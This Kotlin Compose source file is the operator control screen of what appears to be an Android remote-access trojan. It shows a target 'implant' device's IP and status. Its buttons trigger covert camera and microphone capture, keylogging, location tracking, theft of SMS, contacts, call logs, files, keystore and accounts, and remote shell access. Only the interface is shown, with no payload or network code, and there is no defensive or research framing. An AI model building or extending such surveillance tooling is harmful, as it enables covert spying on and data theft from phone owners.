package com.shadow.operator.ui.client

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.ImplantEntity

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ClientControlScreen(
    implant: ImplantEntity,
    onNavigateBack: () -> Unit,
    onActionSelected: (String) -> Unit
) {
    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text(implant.nickname ?: implant.implantId.take(8), color = Color.White) },
                navigationIcon = {
                    IconButton(onClick = onNavigateBack) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = Color.White)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Color(0xFF121212)),
                actions = {
                    IconButton(onClick = { onActionSelected("SETTINGS") }) {
                        Icon(Icons.Default.Settings, contentDescription = "Settings", tint = Color.White)
                    }
                }
            )
        },
        containerColor = Color.Black
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(16.dp)
        ) {
            // Target Info Summary
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E1E1E)),
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(
                    modifier = Modifier.padding(16.dp).fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column {
                        Text("IP: ${implant.networkIp ?: "Unknown"}", color = Color.LightGray, fontSize = 12.sp)
                        Text("Android: ${implant.androidVersion ?: "?"}", color = Color.LightGray, fontSize = 12.sp)
                    }
                    Column(horizontalAlignment = Alignment.End) {
                        Text(if(implant.isOnline) "ONLINE" else "OFFLINE", 
                            color = if(implant.isOnline) Color.Green else Color.Red, 
                            fontWeight = FontWeight.Bold, fontSize = 12.sp)
                        Text("Last: Just now", color = Color.Gray, fontSize = 10.sp) // TODO: format time
                    }
                }
            }

            Spacer(modifier = Modifier.height(24.dp))
            Text("SURVEILLANCE", color = Color.Gray, fontSize = 12.sp, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(8.dp))

            LazyVerticalGrid(
                columns = GridCells.Fixed(3),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                item { ActionButton(Icons.Default.Videocam, "Cam Front", Color(0xFF00B0FF)) { onActionSelected("CAM_FRONT") } }
                item { ActionButton(Icons.Default.CameraAlt, "Cam Back", Color(0xFF00B0FF)) { onActionSelected("CAM_BACK") } }
                item { ActionButton(Icons.Default.Mic, "Mic Live", Color(0xFFD50000)) { onActionSelected("MIC_LIVE") } }
                item { ActionButton(Icons.Default.Screenshot, "Screen", Color(0xFFFF9100)) { onActionSelected("SCREENSHOT") } }
                item { ActionButton(Icons.Default.Keyboard, "Keylog", Color(0xFF651FFF)) { onActionSelected("KEYLOGGER") } }
                item { ActionButton(Icons.Default.LocationOn, "Location", Color(0xFF00E676)) { onActionSelected("LOCATION") } }
            }

            Spacer(modifier = Modifier.height(24.dp))
            Text("DATA EXTRACTION", color = Color.Gray, fontSize = 12.sp, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(8.dp))

            LazyVerticalGrid(
                columns = GridCells.Fixed(3),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                item { ActionButton(Icons.Default.Contacts, "Contacts", Color.White) { onActionSelected("CONTACTS") } }
                item { ActionButton(Icons.Default.Call, "Call Log", Color.White) { onActionSelected("CALL_LOG") } }
                item { ActionButton(Icons.Default.Message, "SMS", Color.White) { onActionSelected("SMS") } }
                item { ActionButton(Icons.Default.Folder, "Files", Color(0xFFFFD600)) { onActionSelected("FILE_MANAGER") } }
                item { ActionButton(Icons.Default.Lock, "Keystore", Color(0xFFC51162)) { onActionSelected("CRYPTO") } }
                item { ActionButton(Icons.Default.AccountCircle, "Accounts", Color.White) { onActionSelected("ACCOUNTS") } }
            }

            Spacer(modifier = Modifier.height(24.dp))
            Text("SYSTEM & CONTROL", color = Color.Gray, fontSize = 12.sp, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(8.dp))

            LazyVerticalGrid(
                columns = GridCells.Fixed(3),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                item { ActionButton(Icons.Default.Terminal, "Shell", Color(0xFF00E5FF)) { onActionSelected("SHELL") } }
                item { ActionButton(Icons.Default.Extension, "Modules", Color(0xFFAA00FF)) { onActionSelected("MODULES") } }
                item { ActionButton(Icons.Default.Warning, "KILL", Color(0xFFD50000)) { onActionSelected("KILL") } }
            }
        }
    }
}

@Composable
fun ActionButton(icon: ImageVector, label: String, iconColor: Color, onClick: () -> Unit) {
    Card(
        modifier = Modifier
            .aspectRatio(1f)
            .clickable(onClick = onClick),
        colors = CardDefaults.cardColors(containerColor = Color(0xFF1E1E1E)),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(
            modifier = Modifier.fillMaxSize(),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Icon(icon, contentDescription = label, tint = iconColor, modifier = Modifier.size(32.dp))
            Spacer(modifier = Modifier.height(8.dp))
            Text(label, color = Color.White, fontSize = 11.sp, textAlign = TextAlign.Center)
        }
    }
}